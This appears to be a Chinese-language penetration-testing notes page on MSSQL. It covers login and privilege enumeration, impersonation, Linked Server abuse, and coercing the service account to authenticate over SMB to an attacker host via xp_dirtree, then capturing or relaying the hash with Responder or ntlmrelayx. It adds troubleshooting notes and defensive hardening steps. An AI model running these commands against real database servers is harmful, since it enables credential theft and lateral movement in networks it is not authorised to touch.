# MSSQL

能登录数据库，不等于能执行操作系统命令。先枚举权限，再决定是提权、Linked Server，还是触发一次出站认证。

## 登录与枚举

```bash
impacket-mssqlclient DOMAIN/USER:PASS@TARGET
# 或 SQL 认证
impacket-mssqlclient USER:PASS@TARGET
```

进去之后优先搞清：当前用户、是否 `sysadmin`、能否 impersonate、有没有 Linked Server。社区脚本：[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)、[SQLRecon](https://github.com/skahwah/SQLRecon)。在实验机加载，不要从不可信源 IEX。

```sql
SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');
EXECUTE AS LOGIN = 'sa'; -- 仅当有 impersonate 权限时才可能成功
REVERT;
EXEC sp_linkedservers;
```

`xp_cmdshell` 关着且你不是 sysadmin 时，不要把时间花在「怎么打开它」。换 impersonation、CLR、OLE、Linked Server，或出站认证。

## Linked Server

能 `SELECT` 远程表，不等于能在远程执行。远程执行依赖映射登录的权限和 `rpc out` 等选项。失败时分别验证：

1. 链接是否存在
2. 当前登录映射成远程哪一个身份
3. 那个身份有没有命令执行面

## 出站认证（命令执行不可用时）

SQL Server 进程若以域账户跑，查询 UNC 路径可能对你的实验机发起 SMB 认证。这是「用数据库当触发器」，不是 SQL 注入本身。

```sql
-- 概念：让服务账户去访问一个 UNC。只在授权实验网做。
EXEC master..xp_dirtree '\\LHOST\lab';
```

攻击机侧用 [Responder](https://github.com/lgandx/Responder) 捕获，或 `impacket-ntlmrelayx` 中继。中继前先看 SMB 签名：

```bash
nmap -p445 --script smb2-security-mode TARGET
```

`enabled but not required` 才谈中继；`required` 则只能捕获后尝试破解，且要遵守授权范围。

SQL 在内网、Kali 不在同一网段时，先把 445 的**接收点**放到目标可达的跳板，再转到 Kali。见 [隧道与转发](/topics/pivoting)。正向 SOCKS 连 SQL 成功，不代表 SQL 能连回 Kali。

## 失败分类

| 现象 | 先查 |
|---|---|
| 能登录不能 `xp_cmdshell` | 权限；走 impersonate / 链接 / 认证触发 |
| UNC 没有认证到来 | 出站被拦；服务账户是本地账户；接收点地址填错 |
| 中继失败 | 签名强制；目标不是你以为的那台 |

## 防御侧

- 数据库账户最小权限；关 `xp_cmdshell`、OLE、不必要的 CLR
- 服务用 gMSA；禁止随意出站 SMB
- 全网 SMB 签名强制
- Linked Server 映射不要用高权账户
